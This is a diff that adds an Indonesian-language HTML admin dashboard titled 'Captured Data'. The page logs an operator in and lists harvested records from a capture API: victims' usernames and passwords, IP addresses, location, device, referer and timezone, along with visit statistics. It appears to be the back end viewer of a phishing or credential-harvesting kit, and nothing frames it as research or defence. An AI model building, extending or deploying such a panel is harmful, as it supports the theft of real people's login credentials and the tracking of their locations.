@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Admin Panel</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
+body { background:#0a0a0a; color:#fff; min-height:100vh; }
+
+.login-box { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
+.login-card { background:#121212; border:1px solid #262626; border-radius:12px; padding:32px; width:100%; max-width:360px; }
+.login-card h1 { font-size:22px; margin-bottom:24px; text-align:center; }
+.login-card input { width:100%; padding:12px; margin-bottom:10px; background:#1a1a1a; border:1px solid #333; border-radius:8px; color:#fff; font-size:14px; outline:none; }
+.login-card input:focus { border-color:#0095f6; }
+.login-card button { width:100%; padding:12px; background:#0095f6; border:none; border-radius:8px; color:#fff; font-size:14px; font-weight:600; cursor:pointer; }
+.login-card button:hover { background:#1877f2; }
+.error { color:#ff4444; font-size:13px; margin-bottom:12px; text-align:center; }
+
+.panel { display:none; padding:20px; max-width:900px; margin:0 auto; }
+.panel.active { display:block; }
+.panel-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; padding-bottom:14px; border-bottom:1px solid #262626; }
+.panel-header h1 { font-size:20px; }
+.panel-header button { padding:8px 14px; background:#262626; border:none; border-radius:6px; color:#fff; font-size:13px; cursor:pointer; }
+.panel-header button:hover { background:#333; }
+.stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:10px; margin-bottom:20px; }
+.stat { background:#121212; border:1px solid #262626; border-radius:10px; padding:14px; text-align:center; }
+.stat-num { font-size:24px; font-weight:700; color:#0095f6; }
+.stat-label { font-size:11px; color:#888; margin-top:4px; text-transform:uppercase; letter-spacing:0.5px; }
+.refresh-btn { padding:10px 16px; background:#0095f6; border:none; border-radius:8px; color:#fff; font-size:13px; font-weight:600; cursor:pointer; margin-bottom:14px; }
+.refresh-btn:hover { background:#1877f2; }
+.loading { text-align:center; padding:40px; color:#888; }
+.empty { text-align:center; padding:40px; color:#888; font-size:14px; }
+.visit { background:#121212; border:1px solid #262626; border-radius:10px; padding:14px; margin-bottom:10px; }
+.visit-top { display:flex; justify-content:space-between; margin-bottom:8px; }
+.visit-time { font-size:11px; color:#888; }
+.visit-num { font-size:11px; color:#0095f6; font-weight:600; }
+.visit-row { font-size:13px; margin-bottom:6px; display:flex; gap:8px; }
+.visit-row .label { color:#888; min-width:70px; }
+.visit-row .value { color:#fff; word-break:break-all; }
+.visit-row .value.user { color:#ffd700; font-weight:600; }
+.visit-row .value.pass { color:#ff6b6b; font-weight:600; }
+.visit-row .value.ip { color:#4ade80; }
+.visit-row .value.ua { font-size:11px; color:#aaa; }
+</style>
+</head>
+<body>
+
+<div id="loginBox" class="login-box">
+    <div class="login-card">
+        <h1>Admin Panel</h1>
+        <div id="loginError" class="error" style="display:none;"></div>
+        <input type="text" id="adminUser" placeholder="Username" autocomplete="off">
+        <input type="password" id="adminPass" placeholder="Password" autocomplete="off">
+        <button onclick="doLogin()">Login</button>
+    </div>
+</div>
+
+<div id="panel" class="panel">
+    <div class="panel-header">
+        <h1>Captured Data</h1>
+        <button onclick="logout()">Logout</button>
+    </div>
+    <div class="stats">
+        <div class="stat"><div class="stat-num" id="statTotal">0</div><div class="stat-label">Total</div></div>
+        <div class="stat"><div class="stat-num" id="statToday">0</div><div class="stat-label">Hari Ini</div></div>
+        <div class="stat"><div class="stat-num" id="statUnique">0</div><div class="stat-label">Unique IP</div></div>
+    </div>
+    <button class="refresh-btn" onclick="loadData()">Refresh</button>
+    <div id="dataContainer"></div>
+</div>
+
+<script>
+async function doLogin() {
+    const u = document.getElementById('adminUser').value;
+    const p = document.getElementById('adminPass').value;
+
+    const res = await fetch('/api/login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ username: u, password: p })
+    });
+    const data = await res.json();
+
+    if (data.isAdmin) {
+        sessionStorage.setItem('admin_token', data.token);
+        showPanel();
+    } else {
+        const err = document.getElementById('loginError');
+        err.textContent = 'Username atau password salah';
+        err.style.display = 'block';
+    }
+}
+
+function logout() {
+    sessionStorage.removeItem('admin_token');
+    location.reload();
+}
+
+async function showPanel() {
+    const token = sessionStorage.getItem('admin_token');
+    if (!token) { location.reload(); return; }
+
+    const res = await fetch('/api/verify', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ token })
+    });
+    const data = await res.json();
+
+    if (!data.valid) {
+        sessionStorage.removeItem('admin_token');
+        location.reload();
+        return;
+    }
+
+    document.getElementById('loginBox').style.display = 'none';
+    document.getElementById('panel').classList.add('active');
+    loadData();
+}
+
+async function loadData() {
+    const container = document.getElementById('dataContainer');
+    container.innerHTML = '<div class="loading">Memuat data...</div>';
+    try {
+        const res = await fetch('/api/capture', { method: 'GET' });
+        const data = await res.json();
+        renderData(data.visits || []);
+    } catch (err) {
+        container.innerHTML = '<div class="empty">Gagal memuat data</div>';
+    }
+}
+
+function renderData(visits) {
+    const container = document.getElementById('dataContainer');
+    if (!visits.length) {
+        container.innerHTML = '<div class="empty">Belum ada data masuk</div>';
+        document.getElementById('statTotal').textContent = '0';
+        document.getElementById('statToday').textContent = '0';
+        document.getElementById('statUnique').textContent = '0';
+        return;
+    }
+    const today = new Date().toISOString().split('T')[0];
+    const todayCount = visits.filter(v => v.timestamp && v.timestamp.startsWith(today)).length;
+    const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+
+    document.getElementById('statTotal').textContent = visits.length;
+    document.getElementById('statToday').textContent = todayCount;
+    document.getElementById('statUnique').textContent = uniqueIPs;
+
+    container.innerHTML = visits.map((v, i) => `
+        <div class="visit">
+            <div class="visit-top">
+                <span class="visit-num">#${visits.length - i}</span>
+                <span class="visit-time">${v.timestamp || '-'}</span>
+            </div>
+            ${v.username ? `<div class="visit-row"><span class="label">Username</span><span class="value user">${escapeHtml(v.username)}</span></div>` : ''}
+            ${v.password ? `<div class="visit-row"><span class="label">Password</span><span class="value pass">${escapeHtml(v.password)}</span></div>` : ''}
+            <div class="visit-row"><span class="label">IP</span><span class="value ip">${v.ip || '-'}</span></div>
+            <div class="visit-row"><span class="label">Location</span><span class="value">${v.city || '-'}, ${v.country || '-'}</span></div>
+            <div class="visit-row"><span class="label">Device</span><span class="value ua">${(v.user_agent || '-').substring(0, 80)}</span></div>
+            <div class="visit-row"><span class="label">Referer</span><span class="value">${v.referer || '-'}</span></div>
+            ${v.screen ? `<div class="visit-row"><span class="label">Screen</span><span class="value">${v.screen}</span></div>` : ''}
+            ${v.timezone ? `<div class="visit-row"><span class="label">Timezone</span><span class="value">${v.timezone}</span></div>` : ''}
+        </div>
+    `).join('');
+}
+
+function escapeHtml(s) {
+    if (!s) return '';
+    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+if (sessionStorage.getItem('admin_token')) {
+    showPanel();
+}
+
+document.addEventListener('keydown', e => {
+    if (e.key === 'Enter' && document.getElementById('loginBox').style.display !== 'none') {
+        doLogin();
+    }
+});
+</script>
+</body>
+</html>
